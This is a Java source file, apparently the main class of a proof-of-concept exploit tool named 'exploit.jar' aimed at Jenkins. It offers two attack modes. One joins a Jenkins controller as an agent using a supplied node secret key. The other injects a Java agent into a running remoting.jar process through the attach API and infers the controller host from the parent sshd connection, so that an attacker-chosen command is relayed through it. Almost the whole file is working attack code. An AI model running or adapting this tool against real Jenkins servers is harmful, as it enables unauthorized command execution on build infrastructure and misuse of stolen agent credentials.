package poc;
import hudson.remoting.Engine;
import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.lang.instrument.Instrumentation;
import java.util.HashMap;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import com.sun.tools.attach.VirtualMachine;
import java.util.Map;



public class Main {
    private static JSONObject parseJsonArgs(String agentArgs) {
        if (agentArgs != null && !agentArgs.isEmpty()) {
            try {
                // Convert the string into a JSONObject
                return new JSONObject(agentArgs);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return new JSONObject(); // Return an empty JSON object on error
    }

    public static void agentmain(String agentArgs, Instrumentation inst) {
        System.out.println("agentArgs: " + agentArgs);

        JSONObject jsonObject = parseJsonArgs(agentArgs);

        String jenkinsUrl = jsonObject.optString("jenkinsUrl");
        String cmd = jsonObject.optString("cmd");

        PocListener pl = new PocListener(jenkinsUrl, cmd);
        pl.exploit();
    }


    public static void help() {
        System.out.println("Exploit Usages:");
        System.out.println("    java -jar exploit.jar mode_secret <jenkinsUrl> <nodeName> <nodeSecretKey>");
        System.out.println("    java -jar exploit.jar mode_attach <jenkinsUrl> <cmd>");
        System.out.println("    java -jar exploit.jar mode_attach <cmd>");
    }


    public static void modeSecret(String[] args) {
        System.out.println("MODE SECRET");

        if (args.length < 4) {
            System.out.println("Usage: java -jar exploit.jar mode_secret <jenkinsUrl> <nodeName> <nodeSecretKey>");
            System.exit(0);
        }

        String jenkinsUrl = args[1];
        String agentName = args[2];
        String secretKey = args[3];
        Path workDir = Paths.get(System.getProperty("java.io.tmpdir"), "jenkins");

        System.out.println("[*] Starting the exploit");
        System.out.println("    jenkinsUrl: " + jenkinsUrl);
        System.out.println("    agentName:  " + agentName);
        System.out.println("    secretKey:  " + secretKey);
        System.out.println("    workDir:    " + workDir);

        try {
            List<URL> urls = new ArrayList<>();
            urls.add(new URL(jenkinsUrl));

            Engine engine = new Engine(new PocListener(jenkinsUrl), urls, secretKey, agentName);
            engine.setWorkDir(workDir);
            engine.startEngine();
            engine.join();

        } catch (Exception e) {
            System.out.println("Exception: " + e.getMessage());
            e.printStackTrace();
        }
    }

// java -jar exploit.jar mode_attach <jenkinsUrl> <cmd>
// java -jar exploit.jar mode_attach <cmd>

    public static void modeAttach(String[] args) {
        System.out.println("MODE ATTACH");

        String jenkinsUrl = null;
        String cmd = null;

        if (args.length == 3) {
            jenkinsUrl = args[1];
            cmd = args[2];
        }
        else if (args.length == 2) {
            cmd = args[1];
        }
        else {
            System.out.println("Usage 1: java -jar exploit.jar mode_attach <jenkinsUrl> <cmd>");
            System.out.println("Usage 2: java -jar exploit.jar mode_attach <cmd>");
            System.exit(0);
        }

        SystemUtils systemUtils = new SystemUtils();

        int pid = systemUtils.getRemotingPid();
        String jarFile = systemUtils.getJARFilename();

        Map<Integer, String> pidCmdMap = systemUtils.getPidArgs();
        Map<Integer, Integer> pidPpid  = systemUtils.getPidPpid();

        int curPid = pid;
        while (pidPpid.containsKey(curPid)) {
            String procCmd = pidCmdMap.get(curPid);
            //System.out.println("PID: " + curPid + ", Command: " + cmd);
            if (procCmd.contains("sshd")) break;
            curPid = pidPpid.get(curPid);
        }

        if (jenkinsUrl == null) {
            String host = systemUtils.getClientFromSSHDPid(curPid);
            jenkinsUrl = "http://" + host + ":8080/";
        }

        System.out.println("[*] Starting the exploit");
        System.out.println("    JAR file:              " + jarFile);
        System.out.println("    pid of remoting.jar:   " + pid);
        System.out.println("    pid of SSH connection: " + curPid);
        System.out.println("    cmd:                   " + cmd);
        System.out.println("    jenkinsUrl:            " + jenkinsUrl);

        JSONObject jo = new JSONObject();
        jo.put("jenkinsUrl", jenkinsUrl);
        jo.put("cmd", cmd);

        String instrumentationArgs = jo.toString();

        try {
            VirtualMachine vm = VirtualMachine.attach(String.valueOf(pid));
            vm.loadAgent(jarFile, instrumentationArgs);
            vm.detach();
            System.out.println("Agent attached successfully.");
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.exit(0);
    }


    public static void main(String[] args) {
        if (args.length < 1) {
            help();
            System.exit(0);
        }

        if (args[0].equals("mode_secret")) {
            modeSecret(args);
        }
        else if (args[0].equals("mode_attach")) {
            modeAttach(args);
        }
        else {
            System.out.println("This is a invalid mode!");
            help();
        }

    }
}
